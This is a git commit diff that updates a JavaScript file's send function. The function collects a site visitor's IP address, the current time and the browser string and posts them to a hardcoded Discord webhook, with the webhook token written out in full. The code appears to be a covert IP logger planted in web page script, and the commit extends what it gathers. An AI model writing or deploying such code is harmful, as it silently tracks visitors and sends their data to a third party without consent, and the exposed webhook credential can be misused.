d2d1c9bc49b78f997ebd6440d408d13d874e1018
para-clan <paraorganisation@gmail.com>
2024-08-04 00:26:10 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,21 +1,19 @@
-function sleep(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
-}
 
-function send(ip){
+function send(ip,browser){
+
     const webhook = "https://discord.com/api/webhooks/1269346466816852042/qN_W9h76M6DPWFP3bszZMPdWX85u7Om-mI5eiLzbUHm18h3fGNBiiSZKSLYLzpyWG_pa";
-    const msg = `IP: ${ip} \nTime: ${new Date().toLocaleString()}\n `;
+
+    const msg = `\n
+IP: ${ip}
+Time: ${new Date().toLocaleString()}
+Browser: ${browser}
+------------------------------`;
     const request = new XMLHttpRequest();
     request.open("POST", webhook);
     request.setRequestHeader('Content-type', 'application/json');
-    const params = {
-        content: msg
-    }
+
+    const params = {content: msg}
+
     request.send(JSON.stringify(params));
-
-    sleep(2000).then(() => {
-        //window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ?&autoplay=1");
-    });
-
-    
+        
 }
